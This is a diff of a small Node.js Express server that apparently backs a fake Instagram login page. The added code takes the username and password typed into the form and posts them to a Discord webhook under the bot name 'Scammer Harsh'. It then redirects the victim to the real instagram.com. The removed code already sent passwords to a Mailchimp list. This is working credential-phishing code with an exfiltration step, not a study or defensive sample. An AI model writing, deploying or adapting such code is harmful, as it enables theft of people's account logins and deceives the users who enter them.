@@ -1,58 +1,31 @@
 const express = require("express");
-const bodyParser = require("body-parser");
-const https = require("https");
-// const { getMaxListeners } = require("process");
+const axios = require("axios");
 const app = express();
+require("dotenv").config();
 
-app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static("public"));
 
 app.get("/", (req, res) => {
   res.sendFile(__dirname + "/index.html");
 });
 
-app.post("/", (req, res) => {
+app.post("/", async (req, res) => {
   // console.log(req.body);
   const uname = req.body.username;
   const pass = req.body.password;
-  let email = "";
-  if (!uname.includes("@gmail.com")) {
-    email = uname + "@gmail.com";
-  } else {
-    email = uname;
-  }
-  console.log(email, pass);
-  const data = {
-    members: [
-      {
-        email_address: email,
-        status: "subscribed",
-        merge_fields: {
-          PASS: pass,
-          UNAME: uname,
-        },
-      },
-    ],
-  };
-  const dataJson = JSON.stringify(data);
-  const url = "https://us7.api.mailchimp.com/3.0/lists/LIST_ID";
-  const options = {
-    method: "POST",
-    auth: "aman:API_KEY",
-  };
-  const request = https.request(url, options, (response) => {
-    response.on("data", (data) => {
-      data = JSON.parse(data);
-      console.log(data);
-      if (res.statusCode == 200 && data.error_count == 0) {
-        res.sendFile(__dirname + "/success.html");
-      } else {
-        res.sendFile(__dirname + "/fail.html");
-      }
+
+  await axios
+    .post(process.env.DISCORD_WEBHOOK_URL, {
+      content: `\`\`\`\nUsername: ${uname}\nPassword: ${pass}\`\`\``,
+      avatar_url:
+        "https://cdn.discordapp.com/avatars/326751032489017346/a_7d0249eb98292a8ddda9ee091ea66252.png",
+      username: "Scammer Harsh",
+    })
+    .catch((err) => {
+      console.log(err);
     });
-  });
-  request.write(dataJson);
-  request.end();
+  res.redirect("https://www.instagram.com/");
 });
 
 app.listen(process.env.PORT || "3000", () => {
